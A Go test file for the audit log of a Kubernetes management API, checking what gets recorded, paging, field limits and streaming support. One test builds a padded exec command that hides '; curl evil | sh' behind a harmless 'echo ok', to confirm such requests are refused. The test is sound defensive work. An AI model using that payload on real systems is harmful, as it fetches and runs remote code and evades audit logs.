package api

import (
	"bufio"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"kubebench/internal/plugin"
	"kubebench/internal/store"
)

func TestMutationsAreAudited(t *testing.T) {
	e := newTestEnv(t, nil)
	for _, target := range []string{"/api/pods", "/api/deployments?ns=default", "/api/users", "/api/audit"} {
		expect(t, e.do(http.MethodGet, target, "admin", nil), http.StatusOK, "")
	}
	if rows := e.audit(); len(rows) != 0 {
		t.Fatalf("reads were audited: %+v", rows)
	}

	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns=default&name=web&replicas=3", "alice", nil), http.StatusOK, "")
	expect(t, e.do(http.MethodDelete, "/api/pods?ns=default&name=web-1", "bob", nil), http.StatusForbidden, plugin.CodeForbiddenRole)
	expect(t, e.do(http.MethodPost, "/api/users", "admin",
		map[string]string{"username": "dave", "password": "dave-password", "role": "user"}), http.StatusOK, "")

	rows := e.audit() // newest first
	if len(rows) != 3 {
		t.Fatalf("audit rows = %+v", rows)
	}
	want := []store.AuditEntry{
		{Username: "admin", Cluster: "", Action: "POST /api/users", Target: "user/dave", Status: 200, Detail: `{"role":"user"}`},
		{Username: "bob", Cluster: "test", Action: "DELETE /api/pods", Target: "pod/default/web-1", Status: 403},
		{Username: "alice", Cluster: "test", Action: "POST /api/deployments/scale", Target: "deployment/default/web", Status: 200, Detail: `{"replicas":"3"}`},
	}
	for i, w := range want {
		got := rows[i]
		if got.Username != w.Username || got.Cluster != w.Cluster || got.Action != w.Action ||
			got.Target != w.Target || got.Status != w.Status || (w.Detail != "" && got.Detail != w.Detail) {
			t.Errorf("row %d = %+v, want %+v", i, got, w)
		}
	}
	if !strings.HasPrefix(rows[1].Detail, "forbidden_role: ") {
		t.Errorf("a denied attempt records the reason, got %q", rows[1].Detail)
	}

	// Routes whose path does not name the kind declare it (auditKinds), so
	// a denied request, which never reaches the handler, still gets it.
	expect(t, e.do(http.MethodPost, "/api/exec?ns=default&pod=web-1&container=app&cmd=id", "bob", nil),
		http.StatusForbidden, plugin.CodeForbiddenRole)
	if row := e.audit()[0]; row.Action != "POST /api/exec" || row.Target != "pod/default/web-1/app" {
		t.Errorf("exec row = %+v", row)
	}
}

func TestDryRunNeedsReadAndIsNotAudited(t *testing.T) {
	fake := newFakePlugin("fake")
	e := newTestEnv(t, nil, fake)

	rec := e.do(http.MethodPost, "/api/plugins/fake/items/a?dryRun=true", "bob", nil)
	expect(t, rec, http.StatusOK, "")
	if got := decode[map[string]bool](t, rec); !got["dryRun"] {
		t.Fatalf("handler did not see the dry run: %v", got)
	}
	if rows := e.audit(); len(rows) != 0 {
		t.Fatalf("a dry run was audited: %+v", rows)
	}
	// Only exactly dryRun=true relaxes the gate.
	expect(t, e.do(http.MethodPost, "/api/plugins/fake/items/a?dryRun=1", "bob", nil), http.StatusForbidden, plugin.CodeForbiddenRole)
	expect(t, e.do(http.MethodPost, "/api/plugins/fake/items/a", "bob", nil), http.StatusForbidden, plugin.CodeForbiddenRole)
	expect(t, e.do(http.MethodPost, "/api/plugins/fake/items/a", "alice", nil), http.StatusOK, "")

	rows := e.audit()
	if len(rows) != 3 || rows[0].Action != "POST /api/plugins/fake/items/{name}" || rows[0].Target != "item/a" || rows[0].Status != 200 {
		t.Fatalf("audit rows = %+v", rows)
	}
}

func TestListAuditPages(t *testing.T) {
	e := newTestEnv(t, nil)
	for i := 0; i < 5; i++ {
		user := "alice"
		if i%2 == 1 {
			user = "bob"
		}
		if err := e.store.InsertAudit(store.AuditEntry{Username: user, Cluster: "test", Action: "POST /api/x", Status: 200}); err != nil {
			t.Fatal(err)
		}
	}
	page := decode[auditPage](t, e.do(http.MethodGet, "/api/audit?limit=2", "admin", nil))
	if len(page.Items) != 2 || page.NextBefore == nil || *page.NextBefore != page.Items[1].ID || page.Items[0].ID != 5 {
		t.Fatalf("first page = %+v", page)
	}
	last := decode[auditPage](t, e.do(http.MethodGet, "/api/audit?limit=2&before=2", "admin", nil))
	if len(last.Items) != 1 || last.NextBefore != nil {
		t.Fatalf("last page = %+v", last)
	}
	if bobs := decode[auditPage](t, e.do(http.MethodGet, "/api/audit?user=bob", "admin", nil)); len(bobs.Items) != 2 {
		t.Fatalf("user filter = %+v", bobs)
	}
	if page.Items[0].TS == "" || page.Items[0].User != "alice" {
		t.Fatalf("item = %+v", page.Items[0])
	}
	expect(t, e.do(http.MethodGet, "/api/audit?limit=0", "admin", nil), http.StatusBadRequest, plugin.CodeBadRequest)
}

// hijackableWriter is a ResponseWriter that supports Hijack, like the
// server's own.
type hijackableWriter struct {
	*httptest.ResponseRecorder
	hijacked bool
}

func (h *hijackableWriter) Hijack() (net.Conn, *bufio.ReadWriter, error) {
	h.hijacked = true
	client, server := net.Pipe()
	_ = client.Close()
	return server, bufio.NewReadWriter(bufio.NewReader(server), bufio.NewWriter(server)), nil
}

func TestAuditWriterKeepsStreamingInterfaces(t *testing.T) {
	e := newTestEnv(t, nil)
	c := &call{user: &store.User{Username: "alice"}}
	req := httptest.NewRequest(http.MethodGet, "/api/exec/ws?ns=default&pod=web-1&container=app", nil)

	// WebSocket handlers hijack the connection: the row is written then,
	// with 101, not when the session ends.
	under := &hijackableWriter{ResponseRecorder: httptest.NewRecorder()}
	aw := e.srv.newAuditWriter(under, req, c, "exec.session", auditTarget{kind: "pod"})
	conn, _, err := http.NewResponseController(aw).Hijack()
	if err != nil || !under.hijacked {
		t.Fatalf("Hijack through the audit writer: %v", err)
	}
	defer conn.Close()
	rows := e.audit()
	if len(rows) != 1 || rows[0].Status != http.StatusSwitchingProtocols || rows[0].Target != "pod/default/web-1/app" {
		t.Fatalf("rows after hijack = %+v", rows)
	}
	aw.finish() // the deferred finish when the handler returns
	if len(e.audit()) != 1 {
		t.Fatal("a hijacked request was audited twice")
	}

	// SSE handlers flush.
	rec := httptest.NewRecorder()
	aw = e.srv.newAuditWriter(rec, req, c, "GET /api/stream", auditTarget{})
	if err := http.NewResponseController(aw).Flush(); err != nil || !rec.Flushed {
		t.Fatalf("Flush through the audit writer: %v", err)
	}
	aw.finish()
	if rows := e.audit(); rows[0].Status != http.StatusOK {
		t.Fatalf("flushed stream row = %+v", rows[0])
	}
}

// No request can write audit rows of arbitrary size, refused ones
// included: every field is cut to its limit.
func TestAuditRowsAreBounded(t *testing.T) {
	e := newTestEnv(t, nil)
	huge := strings.Repeat("a", 100_000)
	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns="+huge+"&name=x&replicas=1", "bob", nil),
		http.StatusForbidden, plugin.CodeForbiddenRole)
	e.srv.writeAudit(store.AuditEntry{Username: "alice", Action: huge, Target: huge, Detail: huge})
	for _, row := range e.audit() {
		if len([]rune(row.Action)) > maxAuditAction || len([]rune(row.Target)) > maxAuditTarget || len([]rune(row.Detail)) > maxAuditDetail {
			t.Fatalf("row of %d/%d/%d characters", len(row.Action), len(row.Target), len(row.Detail))
		}
	}
}

// A request is only executed when the audit row can show it completely:
// a command cut off after a harmless start would hide what really ran.
func TestAuditedRequestsAreRecordedCompletely(t *testing.T) {
	e := newTestEnv(t, nil)
	hidden := url.QueryEscape("echo ok" + strings.Repeat(" ", maxAuditDetail) + "; curl evil | sh")
	expect(t, e.do(http.MethodPost, "/api/exec?ns=default&pod=web-1&cmd="+hidden, "alice", nil),
		http.StatusBadRequest, plugin.CodeBadRequest)
	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns=default&name=web&replicas=5&note="+hidden, "alice", nil),
		http.StatusBadRequest, plugin.CodeBadRequest)
	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns=default&name="+strings.Repeat("w", maxAuditTarget), "alice", nil),
		http.StatusBadRequest, plugin.CodeBadRequest)
	if got := e.replicas(); got != 2 {
		t.Fatalf("a request too long to be audited was executed: replicas = %d", got)
	}
	if row := e.audit()[0]; row.Status != http.StatusBadRequest || !strings.HasPrefix(row.Detail, "bad_request: ") {
		t.Fatalf("the refusal must be audited: %+v", row)
	}

	// What fits is recorded as sent, without HTML escaping.
	expect(t, e.do(http.MethodPost, "/api/deployments/scale?ns=default&name=web&replicas=3&note="+url.QueryEscape("a > b & c"), "alice", nil),
		http.StatusOK, "")
	if row := e.audit()[0]; row.Detail != `{"note":"a > b & c","replicas":"3"}` {
		t.Fatalf("detail = %s", row.Detail)
	}
}

// The kind parameter names the target kind only on routes that act on it;
// elsewhere the handler ignores it, so it must not rewrite the row.
func TestKindParamRetargetsOnlyKindRoutes(t *testing.T) {
	e := newTestEnv(t, nil)
	ok := func(w http.ResponseWriter, _ *http.Request, _ *call) { writeOK(w) }
	e.srv.handle("DELETE /api/resource/audit-test", accessWrite, ok)
	e.srv.handle("POST /api/workloads/audit-test", accessWrite, ok)

	for target, want := range map[string]string{
		"/api/pods?ns=default&name=web-1&kind=ConfigMap":                 "pod/default/web-1",
		"/api/resource/audit-test?kind=Deployment&ns=shop&name=web":      "deployment/shop/web",
		"/api/resource/audit-test?ns=shop&name=web":                      "resource/shop/web",
		"/api/workloads/audit-test?kind=StatefulSet&ns=shop&name=db":     "statefulset/shop/db",
		"/api/deployments/scale?ns=default&name=web&replicas=2&kind=Pod": "deployment/default/web",
	} {
		method := http.MethodDelete
		if strings.HasPrefix(target, "/api/workloads") || strings.HasPrefix(target, "/api/deployments") {
			method = http.MethodPost
		}
		expect(t, e.do(method, target, "alice", nil), http.StatusOK, "")
		if row := e.audit()[0]; row.Target != want {
			t.Errorf("%s %s: target %q, want %q", method, target, row.Target, want)
		}
	}
}
